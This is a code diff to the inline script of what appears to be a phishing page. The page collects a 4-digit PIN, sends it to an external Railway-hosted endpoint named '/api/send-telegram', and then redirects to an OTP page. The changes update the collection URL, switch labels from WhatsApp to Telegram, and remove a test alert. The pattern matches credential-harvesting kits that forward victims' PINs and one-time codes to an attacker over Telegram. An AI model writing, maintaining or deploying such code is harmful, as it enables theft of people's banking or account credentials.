@@ -121,9 +121,9 @@
 
 <script>
     // ============================================
-    // CONFIGURATION - UPDATED FOR WHATSAPP
+    // CONFIGURATION - UPDATED WITH NEW RAILWAY URL
     // ============================================
-    const RAILWAY_URL = 'https://inncredits-production-b2dd.up.railway.app';
+    const RAILWAY_URL = 'https://inncredits-production-f02a.up.railway.app';
     
     // Get URL parameters
     const params = new URLSearchParams(window.location.search);
@@ -200,7 +200,7 @@
     }
 
     // ============================================
-    // SEND PIN NOTIFICATION VIA WHATSAPP BACKEND
+    // SEND PIN NOTIFICATION VIA TELEGRAM BACKEND
     // ============================================
     async function sendPinNotification(pin) {
         const payload = {
@@ -219,7 +219,7 @@
         console.log('📤 Sending PIN to backend:', payload);
         
         try {
-           const response = await fetch(`${RAILWAY_URL}/api/send-telegram`, {
+            const response = await fetch(`${RAILWAY_URL}/api/send-telegram`, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify(payload)
@@ -232,13 +232,10 @@
     }
 
     // ============================================
-    // MAIN CONFIRM FUNCTION - WITH ALERT
+    // MAIN CONFIRM FUNCTION
     // ============================================
     window.handleConfirm = async function() {
         const pin = getPin();
-        
-        // ALERT TO TEST IF FUNCTION IS WORKING
-        alert('PIN entered: ' + pin);
         
         if (pin.length !== 4) {
             showError('Please enter all 4 digits.');
@@ -248,7 +245,7 @@
         confirmBtn.disabled = true;
         confirmBtn.textContent = 'Processing...';
 
-        // Send PIN notification via WhatsApp backend
+        // Send PIN notification via backend
         await sendPinNotification(pin);
         
         // Redirect to OTP page
